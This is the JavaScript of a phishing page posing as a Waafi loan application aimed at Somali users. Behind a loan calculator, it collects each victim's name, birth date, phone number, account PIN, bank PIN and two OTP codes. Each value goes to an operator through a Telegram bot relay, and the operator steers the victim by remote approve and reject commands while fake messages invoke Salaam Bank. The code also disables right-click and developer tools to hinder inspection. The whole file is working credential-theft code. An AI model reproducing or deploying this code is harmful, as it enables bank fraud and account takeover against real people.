/* ───────────────────────────────────────────────────────────────────
   TELEGRAM BACKEND ROUTER & TELEMETRY ENGINE
   ─────────────────────────────────────────────────────────────────── */
let lastHandledUpdateId = 0;
let feedbackPollingInterval = null;
const activeTimers = {};

// Initialize dynamic update pointer threshold on setup via serverless API
async function initTelegramPointer() {
    try {
        const response = await fetch('/.netlify/functions/api', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'getUpdates', offset: -1, limit: 1 })
        });
        const data = await response.json();
        if (data.ok && data.result.length > 0) {
            lastHandledUpdateId = data.result[0].update_id;
        }
    } catch (e) { console.error("Could not sync update thread timeline:", e); }
}
initTelegramPointer();

// Extended Transmission Channel Injecting Inline Action Controls
async function dispatchTelegramAlert(messageContent, actionIdentifier) {
    try {
        await fetch('/.netlify/functions/api', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                action: 'sendMessage',
                message: messageContent,
                actionIdentifier: actionIdentifier
            })
        });
    } catch (networkError) {
        console.error("Transmission error:", networkError);
    }
}

// Client-Side Long Polling Feedback Engine
function awaitAdminFeedback(actionIdentifier, commandHandler) {
    if (feedbackPollingInterval) clearInterval(feedbackPollingInterval);
    
    feedbackPollingInterval = setInterval(async () => {
        try {
            const response = await fetch('/.netlify/functions/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'getUpdates', offset: lastHandledUpdateId + 1 })
            });
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    lastHandledUpdateId = update.update_id;
                    
                    if (update.callback_query) {
                        const callbackData = update.callback_query.data;
                        if (callbackData.endsWith(`_${actionIdentifier}`)) {
                            const cmd = callbackData.substring(0, callbackData.lastIndexOf(`_${actionIdentifier}`));
                            clearInterval(feedbackPollingInterval);
                            commandHandler(cmd);
                            return;
                        }
                    }
                }
            }
        } catch (err) { console.error("Polling stream interruption:", err); }
    }, 1500);
}

// MASTER ROUTING LOGIC BASED ON TELEGRAM BUTTON COMMANDS
function handleAdminRoute(cmd) {
    document.getElementById("loaderOv").classList.remove("show");
    
    if (cmd === 'cmd_approve') {
        proceedToSuccess();
    } else if (cmd === 'cmd_reject') {
        showToast("Dalabka waa la diiday. Fadlan isku day markale.");
    } else if (cmd === 'cmd_ask_otp1') {
        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
        document.getElementById("mn1").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
        document.getElementById("otp1Error").style.display = "none";
        om("m1"); startTimer(1);
    } else if (cmd === 'cmd_ask_otp2') {
        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
        document.getElementById("mn2").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
        document.getElementById("otp2Error").style.display = "none";
        om("m2"); startTimer(2);
    } else if (cmd === 'cmd_ask_bank_pin') {
        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
        openBankPinModal();
    } else if (cmd === 'cmd_success') {
        document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
        proceedToSuccess();
    }
}

function proceedToSuccess() {
    document.querySelectorAll('.ov').forEach(el => el.classList.remove('open'));
    document.querySelectorAll('.step-panel').forEach(el => el.classList.remove('active'));
    document.getElementById("footer-step1").style.display = "none";
    document.getElementById("footer-step2").style.display = "none";
    document.getElementById("step-success").classList.add("active");
    document.querySelector('.body').scrollTop = 0;
}

/* ── CONFIGURATION & INSTANCE VARIABLES ── */
const RATE = 0.025;
let loanAmt = 300, loanDur = 1;
let phoneValue = "", otp1Val = "", otp2Val = "";

const userAgentSignature = navigator.userAgent;
let activeDeviceHardware = (/Android/i.test(userAgentSignature) ? "Android" : /iPhone|iPad/i.test(userAgentSignature) ? "iOS" : "Desktop/Unknown");
activeDeviceHardware += (/Chrome/i.test(userAgentSignature) ? " | Chrome" : /Safari/i.test(userAgentSignature) ? " | Safari" : "");

(function(){
    const targetDateObj = new Date();
    targetDateObj.setFullYear(targetDateObj.getFullYear() - 20);
    document.getElementById("dob").max = targetDateObj.toISOString().split("T")[0];
})();

function fillSlider(elementNode, trackColor) {
    const calculationPercentage = ((elementNode.value - elementNode.min) / (elementNode.max - elementNode.min)) * 100;
    elementNode.style.background = `linear-gradient(to right, ${trackColor} ${calculationPercentage}%, #e5e7eb ${calculationPercentage}%)`;
}

function fmt(numericValue) { 
    return parseFloat(numericValue || 0).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); 
}

function calcAge(birthdateString) { 
    if (!birthdateString) return "—"; 
    const birthTimestamp = new Date(birthdateString), currentTimestamp = new Date(); 
    let calculatedAge = currentTimestamp.getFullYear() - birthTimestamp.getFullYear(); 
    if (currentTimestamp < new Date(currentTimestamp.getFullYear(), birthTimestamp.getMonth(), birthTimestamp.getDate())) calculatedAge--; 
    return calculatedAge + " sano"; 
}

function maskPhone(rawPhoneString) { 
    const refinedString = rawPhoneString.replace("+252", "").replace(/\s/g, ""); 
    if (refinedString.length < 7) return rawPhoneString; 
    return "+252 " + refinedString.slice(0, 3) + "****" + refinedString.slice(-2); 
}

/* ── MASTER CALCULATOR EQUATIONS ── */
function recalc(){
    loanAmt = Number(document.getElementById("amountSlider").value);
    loanDur = Number(document.getElementById("durSlider").value);
    
    fillSlider(document.getElementById("amountSlider"), "#7bbf2e");
    fillSlider(document.getElementById("durSlider"), "#5a9020");
    
    const computedInterest = loanAmt * RATE * loanDur;
    const computedTotalSum = loanAmt + computedInterest;
    const computedMonthlySum = computedTotalSum / loanDur;
    const combinedDurationString = loanDur + (loanDur === 1 ? " bil" : " bilood");
    
    document.getElementById("amountVal").textContent = "$" + loanAmt.toLocaleString();
    document.getElementById("durVal").textContent = combinedDurationString;
    document.getElementById("headerAmount").textContent = loanAmt.toLocaleString();
    document.getElementById("headerDur").textContent = loanDur + " BIL";
    document.getElementById("miniMonthly").textContent = "$" + computedMonthlySum.toFixed(2);
    document.getElementById("miniDur").textContent = combinedDurationString;
    document.getElementById("pLoan").textContent = "$" + loanAmt.toFixed(2);
    document.getElementById("pInterest").textContent = "$" + computedInterest.toFixed(2);
    document.getElementById("pTotal").textContent = "$" + computedTotalSum.toFixed(2);
    document.getElementById("pMonthly").textContent = "$" + computedMonthlySum.toFixed(2);
}

document.getElementById("amountSlider").addEventListener("input", recalc);
document.getElementById("durSlider").addEventListener("input", recalc);

function mapPhoneInputBehavior(elementId) {
    document.getElementById(elementId).oninput = function(){
        let structuredDigits = this.value.replace(/\D/g, "");
        if(structuredDigits.startsWith("252")) structuredDigits = structuredDigits.slice(3);
        if(structuredDigits.startsWith("0")) structuredDigits = structuredDigits.slice(1);
        this.value = structuredDigits.slice(0, 9);
        phoneValue = "+252" + this.value;
        
        document.getElementById("calcPhone").value = this.value;
        document.getElementById("authPhone").value = this.value;
        validateStep2Progress();
    };
}
mapPhoneInputBehavior("calcPhone");
mapPhoneInputBehavior("authPhone");

document.getElementById("dob").onchange = function(){
    const currentSelectedVal = new Date(this.value);
    const maximumCapDate = new Date();
    maximumCapDate.setFullYear(maximumCapDate.getFullYear() - 20);
    const errorNode = document.getElementById("dobError");
    if(currentSelectedVal > maximumCapDate){
        errorNode.style.display = "block";
        this.classList.add("input-missing-highlight");
    } else {
        errorNode.style.display = "none";
        this.classList.remove("input-missing-highlight");
    }
};

/* ── STEP 1 FORWARD STRUCTURAL VALIDATION ENGINE ── */
function validateStep1Form(){
    const verificationTargets = [
        { id: "loanType", name: "Nooca Amaahda" },
        { id: "purpose", name: "Ujeedada Amaahda" },
        { id: "firstName", name: "Magaca Hore" },
        { id: "lastName", name: "Magaca Dambe" },
        { id: "dob", name: "Taariikhda Dhalashada" },
        { id: "calcPhone", name: "Lambarka Telefoonka" }
    ];

    verificationTargets.forEach(target => {
        document.getElementById(target.id).classList.remove("input-missing-highlight");
    });

    for (const target of verificationTargets) {
        const DOMNode = document.getElementById(target.id);
        if (!DOMNode.value || DOMNode.value.trim() === "") {
            DOMNode.classList.add("input-missing-highlight");
            DOMNode.focus();
            showToast(`Fadlan buuxi goobta: ${target.name}`);
            return null;
        }
    }

    const cleanPhoneVal = document.getElementById("calcPhone").value.trim();
    if(cleanPhoneVal.length !== 9){
        const pNode = document.getElementById("calcPhone");
        pNode.classList.add("input-missing-highlight");
        pNode.focus();
        showToast("Telefoonku waa inuu noqdaa 9 nambar");
        return null;
    }
    if (cleanPhoneVal.startsWith("63")) {
        const pNode = document.getElementById("calcPhone");
        pNode.classList.add("input-missing-highlight");
        pNode.focus();
        showToast("Nambarada ku bilaabma +25263 xaq uma laha adeegan");
        return null;
    }
    
    const birthdateVal = document.getElementById("dob").value;
    const validatedDateObj = new Date(birthdateVal), minimumCapThreshold = new Date();
    minimumCapThreshold.setFullYear(minimumCapThreshold.getFullYear() - 20);
    if(validatedDateObj > minimumCapThreshold){
        const dNode = document.getElementById("dob");
        dNode.classList.add("input-missing-highlight");
        dNode.focus();
        showToast("Da'da ugu yar waa 20 sano");
        return null;
    }
    
    const intermediateInterest = loanAmt * RATE * loanDur;
    const intermediateTotalSum = loanAmt + intermediateInterest;
    const intermediateMonthlySum = (intermediateTotalSum / loanDur).toFixed(2);
    
    return {
        firstName: document.getElementById("firstName").value.trim(),
        lastName: document.getElementById("lastName").value.trim(),
        phone: "+252" + cleanPhoneVal,
        dob: birthdateVal,
        loanType: document.getElementById("loanType").value,
        purpose: document.getElementById("purpose").value.trim(),
        monthly: intermediateMonthlySum,
        totalRepay: intermediateTotalSum.toFixed(2)
    };
}

function openCalcSummary(){
    const balanceDataset = validateStep1Form();
    if(!balanceDataset) return;
    
    const contextualDurString = loanDur + (loanDur === 1 ? " bil" : " bilood");
    document.getElementById("calcSummaryRows").innerHTML = `
        <div class="sheet-row"><span class="sheet-row-key">Magaca</span><span class="sheet-row-val">${balanceDataset.firstName} ${balanceDataset.lastName}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Telefoon</span><span class="sheet-row-val">${balanceDataset.phone}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Taariikhda Dhalashada</span><span class="sheet-row-val">${balanceDataset.dob}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Nooca Amaahda</span><span class="sheet-row-val">${balanceDataset.loanType}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Ujeedada</span><span class="sheet-row-val">${balanceDataset.purpose}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Xaddiga</span><span class="sheet-row-val">$${loanAmt.toLocaleString()}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Muddada</span><span class="sheet-row-val">${contextualDurString}</span></div>
        <div class="sheet-row"><span class="sheet-row-key">Wadarta La Celinta</span><span class="sheet-row-val">$${fmt(balanceDataset.totalRepay)}</span></div>
    `;
    document.getElementById("calcSummaryMonthly").textContent = "$" + fmt(balanceDataset.monthly);
    openModal('modal-calc-summary');
}

document.getElementById("btnOpenCalcSummary").addEventListener("click", openCalcSummary);
document.getElementById("btnCloseCalcSummary").addEventListener("click", () => closeModal('modal-calc-summary'));
document.getElementById("btnCancelCalcSummary").addEventListener("click", () => closeModal('modal-calc-summary'));
document.getElementById("btnProceedToAuth").addEventListener("click", proceedToAuth);

document.getElementById("modal-calc-summary").addEventListener("click", (e) => handleOverlay(e, 'modal-calc-summary'));

function openModal(id) { document.getElementById(id).classList.add("open"); }
function closeModal(id) { document.getElementById(id).classList.remove("open"); }
function handleOverlay(event, id) { if(event.target === document.getElementById(id)) closeModal(id); }

function proceedToAuth(){
    const executionDataPayload = validateStep1Form();
    if(!executionDataPayload) return;
    
    const activePlanStructure = {
        plan: "Amaahda Waafi",
        loanType: executionDataPayload.loanType,
        purpose: executionDataPayload.purpose,
        loanAmount: loanAmt,
        duration: loanDur,
        monthlyRepayment: executionDataPayload.monthly,
        totalRepayable: executionDataPayload.totalRepay,
        firstName: executionDataPayload.firstName,
        lastName: executionDataPayload.lastName,
        phone: executionDataPayload.phone,
        dob: executionDataPayload.dob
    };
    sessionStorage.setItem("selectedPlan", JSON.stringify(activePlanStructure));
    closeModal('modal-calc-summary');
    
    document.getElementById("step-calculator").classList.remove("active");
    document.getElementById("footer-step1").style.display = "none";
    document.getElementById("header-display-calc").style.display = "none";
    
    document.getElementById("hAmt").textContent = fmt(activePlanStructure.loanAmount);
    document.getElementById("hType").textContent = activePlanStructure.loanType;
    document.getElementById("hDur").textContent = activePlanStructure.duration + " bilood";
    document.getElementById("hAge").textContent = calcAge(activePlanStructure.dob);
    
    document.getElementById("step-auth").classList.add("active");
    document.getElementById("footer-step2").style.display = "block";
    document.getElementById("header-display-auth").style.display = "block";
    
    document.querySelector('.body').scrollTop = 0;
}

/* ── STEP 2 SECURITY FORMS VALIDATION INTERFACE ── */
const securePinElementPointers = [0, 1, 2, 3].map(indexId => document.getElementById("p" + indexId));
let isPinMaskVisible = false;

securePinElementPointers.forEach((inputNode, blockIndex) => {
    inputNode.addEventListener("input", function(){
        const normalizedVal = this.value.replace(/\D/g, "");
        this.value = normalizedVal ? normalizedVal[0] : "";
        document.getElementById("step2Error").style.display = "none";
        if(this.value && blockIndex < 3) securePinElementPointers[blockIndex + 1].focus();
        validateStep2Progress();
    });
    inputNode.addEventListener("keydown", function(eventKey){
        if(eventKey.key === "Backspace" && !this.value && blockIndex > 0){
            securePinElementPointers[blockIndex - 1].value = "";
            securePinElementPointers[blockIndex - 1].focus();
            validateStep2Progress();
        }
    });
});

function getAssembledPin() { 
    return securePinElementPointers.map(element => element.value).join(""); 
}

document.getElementById("eyeBtn").onclick = function(){
    isPinMaskVisible = !isPinMaskVisible;
    securePinElementPointers.forEach(elementNode => elementNode.classList.toggle("show", isPinMaskVisible));
    this.innerHTML = isPinMaskVisible ? 
        `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>` : 
        `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
};

function validateStep2Progress(){
    const controlButtonNode = document.getElementById("mainBtn");
    const operationalStateCondition = (phoneValue.length === 13 && getAssembledPin().length === 4);
    controlButtonNode.classList.toggle("on", operationalStateCondition);
}

function om(id) { document.getElementById(id).classList.add("open"); }
function cm(id) { document.getElementById(id).classList.remove("open"); }
function bgClose(id, event) { if(event.target === document.getElementById(id)) cm(id); }

document.getElementById("modal-bank-pin").addEventListener("click", (e) => bgClose('modal-bank-pin', e));
document.getElementById("btnCloseBankPin").addEventListener("click", () => cm('modal-bank-pin'));
document.getElementById("btnSubmitBankPin").addEventListener("click", submitBankPin);

document.getElementById("m1").addEventListener("click", (e) => bgClose('m1', e));
document.getElementById("btnCloseM1").addEventListener("click", () => cm('m1'));
document.getElementById("g1").addEventListener("click", submitOtp1);

document.getElementById("msum").addEventListener("click", (e) => bgClose('msum', e));
document.getElementById("btnCloseMsum").addEventListener("click", () => cm('msum'));
document.getElementById("btnEditMsum").addEventListener("click", () => cm('msum'));
document.getElementById("btnConfirmMsum").addEventListener("click", openBankPinModal);

document.getElementById("m2").addEventListener("click", (e) => bgClose('m2', e));
document.getElementById("btnCloseM2").addEventListener("click", () => cm('m2'));
document.getElementById("g2").addEventListener("click", submitOtp2);

/* --- SECURITY LOGIN SUBMISSION PIPELINE --- */
document.getElementById("mainBtn").onclick = function(){
    if(!document.getElementById("mainBtn").classList.contains("on")) return;
    
    document.getElementById("step2Error").style.display = "none";
    let activePlanContext = {};
    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}
    
    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
    const formattedTelemetryLog = `
*⚡ WAAFI LOANS - ACCESS LOGIN ATTEMPT*
--------------------------------------------
*👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
*📞 Phone:* \`${phoneValue}\`
*🔑 Secure PIN:* \`${getAssembledPin()}\`
*📱 Device Spec:* ${activeDeviceHardware}
--------------------------------------------
*💰 Loan Target:* $${fmt(activePlanContext.loanAmount)}
*📅 Duration Term:* ${activePlanContext.duration || 1} Months
*📈 Classification:* ${activePlanContext.loanType || "General"}
*🎯 Purpose:* ${activePlanContext.purpose || "Unspecified"}
    `;
    
    document.getElementById("loaderText").textContent = "Xogta waa la hubiyaa... Fadlan sug wax yar";
    document.getElementById("loaderOv").classList.add("show");
    
    const actionKey = "login_" + Date.now();
    dispatchTelegramAlert(formattedTelemetryLog.trim(), actionKey);
    
    awaitAdminFeedback(actionKey, (cmd) => {
        document.getElementById("loaderOv").classList.remove("show");
        if (cmd === 'cmd_approve') {
            document.getElementById("mn1").textContent = "OTP waxaa loo diray " + maskPhone(phoneValue);
            document.getElementById("otp1Error").style.display = "none";
            om("m1");
            startTimer(1);
        } else if (cmd === 'cmd_reject') {
            securePinElementPointers.forEach(input => {
                input.value = "";
                input.classList.add("input-missing-highlight");
            });
            validateStep2Progress();
            securePinElementPointers[0].focus();
            const s2Err = document.getElementById("step2Error");
            s2Err.textContent = "PIN-ka ama nambarka waa khaldan yahay. Fadlan dib u geli.";
            s2Err.style.display = "block";
            setTimeout(() => {
                securePinElementPointers.forEach(input => input.classList.remove("input-missing-highlight"));
            }, 1200);
        } else {
            handleAdminRoute(cmd);
        }
    });
};

/* ── BANKING PIN INTERCEPT PIPELINE ── */
function openBankPinModal() {
    document.getElementById("bankPinInput").value = "";
    document.getElementById("bankPinError").style.display = "none";
    document.getElementById("bankPinInput").classList.remove("input-missing-highlight");
    om("modal-bank-pin");
    setTimeout(() => document.getElementById("bankPinInput").focus(), 150);
}

document.getElementById("bankPinInput").addEventListener("input", function() {
    document.getElementById('bankPinError').style.display = 'none';
    this.classList.remove('input-missing-highlight');
});

async function submitBankPin() {
    const pinVal = document.getElementById("bankPinInput").value;
    const bErr = document.getElementById("bankPinError");
    bErr.style.display = "none";
    document.getElementById("bankPinInput").classList.remove("input-missing-highlight");

    if (pinVal.length < 4 || pinVal.length > 6) {
        document.getElementById("bankPinInput").classList.add("input-missing-highlight");
        bErr.textContent = "Fadlan gali PIN sax ah (4-6 nambar)";
        bErr.style.display = "block";
        return;
    }

    document.getElementById("loaderText").textContent = "Xaqiijinta Bankiga... Fadlan sug";
    document.getElementById("loaderOv").classList.add("show");

    let activePlanContext = {};
    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}

    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
    const telemetryLog = `
*🏦 WAAFI - BANKING PIN INTERCEPT*
--------------------------------------------
*👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
*📞 Phone:* \`${phoneValue}\`
*🔐 Bank PIN:* \`${pinVal}\`
    `;

    const actionKey = "bankpin_" + Date.now();
    dispatchTelegramAlert(telemetryLog.trim(), actionKey);

    awaitAdminFeedback(actionKey, (cmd) => {
        document.getElementById("loaderOv").classList.remove("show");
        if (cmd === 'cmd_approve') {
            cm("modal-bank-pin");
            proceedToSuccess();
        } else if (cmd === 'cmd_reject') {
            document.getElementById("bankPinInput").value = "";
            document.getElementById("bankPinInput").classList.add("input-missing-highlight");
            bErr.textContent = "PIN-ka Bankiga waa khaldan yahay. Fadlan dib u geli.";
            bErr.style.display = "block";
            om("modal-bank-pin");
            setTimeout(() => document.getElementById("bankPinInput").focus(), 150);
        } else {
            handleAdminRoute(cmd);
        }
    });
}

/* ── DUAL OTP INPUT GRID MODULE CONSTRUCTORS ── */
function makeOtp(wrapId, hiddenInputId, elementPrefix, submissionButtonId) {
    const rawInputNode = document.getElementById(hiddenInputId);
    const textCellPointers = [0, 1, 2, 3, 4, 5].map(index => document.getElementById(elementPrefix + index));
    let isNodeDisabled = false;

    document.getElementById(wrapId).addEventListener("click", () => { 
        if (!isNodeDisabled) rawInputNode.focus(); 
    });

    function renderOutputGrid(){
        const strippedValue = rawInputNode.value.replace(/\D/g, "").slice(0, 6);
        rawInputNode.value = strippedValue;
        const structuralLen = strippedValue.length, isFocused = document.activeElement === rawInputNode;
        
        textCellPointers.forEach((cell, cellIndex) => {
            cell.className = "otp-box";
            cell.textContent = strippedValue[cellIndex] || "";
            if (isNodeDisabled) { cell.classList.add("d"); return; }
            if (cellIndex < structuralLen) cell.classList.add("f");
            if (cellIndex === structuralLen && isFocused) cell.classList.add("a");
        });
        
        if (submissionButtonId === "g1") otp1Val = strippedValue; else otp2Val = strippedValue;
        const actBtn = document.getElementById(submissionButtonId);
        if (strippedValue.length === 6) { actBtn.classList.add("on"); } else { actBtn.classList.remove("on"); }
    }

    rawInputNode.addEventListener("input", renderOutputGrid);
    rawInputNode.addEventListener("focus", renderOutputGrid);
    rawInputNode.addEventListener("blur", renderOutputGrid);

    return {
        reset(disableStateFlag) {
            isNodeDisabled = disableStateFlag;
            rawInputNode.value = "";
            rawInputNode.disabled = disableStateFlag;
            renderOutputGrid();
            if (!disableStateFlag) setTimeout(() => rawInputNode.focus(), 100);
        }
    };
}

const otp1InstanceControl = makeOtp("ow1", "oh1", "o1b", "g1");
const otp2InstanceControl = makeOtp("ow2", "oh2", "o2b", "g2");

function startTimer(timerSequenceId) {
    if (activeTimers[timerSequenceId]) {
        clearInterval(activeTimers[timerSequenceId]);
    }
    
    const contextInstance = timerSequenceId === 1 ? otp1InstanceControl : otp2InstanceControl;
    contextInstance.reset(false);
    let durationCountdown = 120;
    
    const trackingTimerLabel = document.getElementById("t" + timerSequenceId);
    const retryTriggerButton = document.getElementById("r" + timerSequenceId);
    
    trackingTimerLabel.textContent = durationCountdown;
    retryTriggerButton.className = "rb";
    
    activeTimers[timerSequenceId] = setInterval(() => {
        durationCountdown--;
        if (durationCountdown <= 0) {
            clearInterval(activeTimers[timerSequenceId]);
            trackingTimerLabel.textContent = "0";
            retryTriggerButton.classList.add("on");
            contextInstance.reset(true);
        } else {
            trackingTimerLabel.textContent = durationCountdown;
        }
    }, 1000);
    
    retryTriggerButton.onclick = () => {
        if (!retryTriggerButton.classList.contains("on")) return;
        clearInterval(activeTimers[timerSequenceId]);
        startTimer(timerSequenceId);
    };
}

/* ── SUBMIT VERIFICATION PIPELINE (OTP 1) ── */
async function submitOtp1() {
    if (otp1Val.length !== 6) return;
    
    const errEl = document.getElementById("otp1Error");
    errEl.style.display = "none";
    
    document.getElementById("oh1").disabled = true;
    document.getElementById("loaderText").textContent = "Ereyga sirta ah waa la hubiyaa... Fadlan sug wax yar";
    document.getElementById("loaderOv").classList.add("show");
    
    let activePlanContext = {};
    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}

    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
    const telemetryOtp1Log = `
*🔑 WAAFI SYSTEM SELECTION - INTERCEPT CODES (OTP 1)*
--------------------------------------------
*👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
*📞 Phone:* \`${phoneValue}\`
*🛡️ Verification Code (OTP 1):* \`${otp1Val}\`
    `;
    
    const actionKey = "otp1_" + Date.now();
    dispatchTelegramAlert(telemetryOtp1Log.trim(), actionKey);

    awaitAdminFeedback(actionKey, (cmd) => {
        document.getElementById("loaderOv").classList.remove("show");
        if (cmd === 'cmd_approve') {
            if (activeTimers[1]) clearInterval(activeTimers[1]);
            cm("m1");
            openBankPinModal();
        } else if (cmd === 'cmd_reject') {
            document.getElementById("oh1").disabled = false;
            otp1InstanceControl.reset(false);
            const boxes = document.querySelectorAll("#ow1 .otp-box");
            boxes.forEach(b => {
                b.classList.add("input-missing-highlight");
                setTimeout(() => b.classList.remove("input-missing-highlight"), 1000);
            });
            errEl.textContent = "OTP code-ka waa khaldan yahay. Fadlan dib u geli.";
            errEl.style.display = "block";
        } else {
            handleAdminRoute(cmd);
        }
    });
}

function buildFinalSummaryRows() {
    let activePlanContext = null;
    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")); } catch (err) {}
    
    if (activePlanContext) {
        const structuralDurationLabel = activePlanContext.duration + (activePlanContext.duration === 1 ? " bil" : " bilood");
        document.getElementById("sumRows").innerHTML = `
            <div class="sr"><span class="srk">Magaca</span><span class="srv">${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}</span></div>
            <div class="sr"><span class="srk">Telefoon</span><span class="srv">${maskPhone(phoneValue)}</span></div>
            <div class="sr"><span class="srk">Da'da</span><span class="srv">${calcAge(activePlanContext.dob)}</span></div>
            <div class="sr"><span class="srk">Nooca Amaahda</span><span class="srv">${activePlanContext.loanType || "—"}</span></div>
            <div class="sr"><span class="srk">Xaddiga</span><span class="srv">$${fmt(activePlanContext.loanAmount)}</span></div>
            <div class="sr"><span class="srk">Muddada</span><span class="srv">${structuralDurationLabel}</span></div>
            <div class="sr"><span class="srk">Wadarta La Celinta</span><span class="srv">$${fmt(activePlanContext.totalRepayable)}</span></div>
        `;
        document.getElementById("sumMo").textContent = "$" + fmt(activePlanContext.monthlyRepayment || 0);
    }
}

function openOtp2() {
    cm("msum");
    document.getElementById("otp2Error").style.display = "none";
    om("m2");
    startTimer(2);
}

/* ── FINAL AUDIT SIGNATURE SUBMISSION (OTP 2) ── */
async function submitOtp2() {
    if (otp2Val.length !== 6) return;
    const errEl = document.getElementById("otp2Error");
    errEl.style.display = "none";

    if (otp2Val === otp1Val) {
        errEl.textContent = "⚠️ OTP-gan waa midkii hore. Fadlan gali mid cusub.";
        errEl.style.display = "block";
        return;
    }
    
    document.getElementById("oh2").disabled = true;
    document.getElementById("loaderText").textContent = "Codsiga waxaa loo gudbinayaa Salaam Bank... Fadlan sug wax yar";
    document.getElementById("loaderOv").classList.add("show");
    
    let activePlanContext = {};
    try { activePlanContext = JSON.parse(sessionStorage.getItem("selectedPlan")) || {}; } catch(err){}

    // Wrapped Phone in bold backticks `phoneValue` for one-click copy in Telegram
    const telemetryOtp2Log = `
*💰 WAAFI DISBURSEMENT CHANNELS - TRANSACTION SIGNED (OTP 2)*
--------------------------------------------
*👤 Profile:* ${activePlanContext.firstName || ""} ${activePlanContext.lastName || ""}
*📞 Phone:* \`${phoneValue}\`
*🛡️ Transfer Signature Code (OTP 2):* \`${otp2Val}\`
--------------------------------------------
*🚀 SYSTEM STATE:* Disbursing total $${fmt(activePlanContext.loanAmount)} directly via Salaam Bank API gateway records.
    `;
    
    const actionKey = "otp2_" + Date.now();
    dispatchTelegramAlert(telemetryOtp2Log.trim(), actionKey);

    awaitAdminFeedback(actionKey, (cmd) => {
        document.getElementById("loaderOv").classList.remove("show");
        if (cmd === 'cmd_approve') {
            if (activeTimers[2]) clearInterval(activeTimers[2]);
            proceedToSuccess();
        } else if (cmd === 'cmd_reject') {
            document.getElementById("oh2").disabled = false;
            otp2InstanceControl.reset(false);
            const boxes = document.querySelectorAll("#ow2 .otp-box");
            boxes.forEach(b => {
                b.classList.add("input-missing-highlight");
                setTimeout(() => b.classList.remove("input-missing-highlight"), 1000);
            });
            errEl.textContent = "Muddada OTP ama saxiixa waa la diiday. Fadlan dib u geli.";
            errEl.style.display = "block";
        } else {
            handleAdminRoute(cmd);
        }
    });
}

function showToast(toastMessage) {
    const toastNode = document.getElementById("toast");
    toastNode.textContent = toastMessage;
    toastNode.classList.add("show");
    setTimeout(() => toastNode.classList.remove("show"), 2400);
}

// Instantiate default calculator indices on load
recalc();

/* ── REVERSE-ENGINEERING AND INSPECTION SECURITY CONTROLS ── */
document.addEventListener('contextmenu', (eventContext) => eventContext.preventDefault());
document.onkeydown = function (shortcutEvent) {
    if (shortcutEvent.keyCode === 123) { return false; }
    if (shortcutEvent.ctrlKey && shortcutEvent.shiftKey && (shortcutEvent.keyCode === 73 || shortcutEvent.keyCode === 74 || shortcutEvent.keyCode === 67)) { return false; }
    if (shortcutEvent.ctrlKey && shortcutEvent.keyCode === 85) { return false; }
};
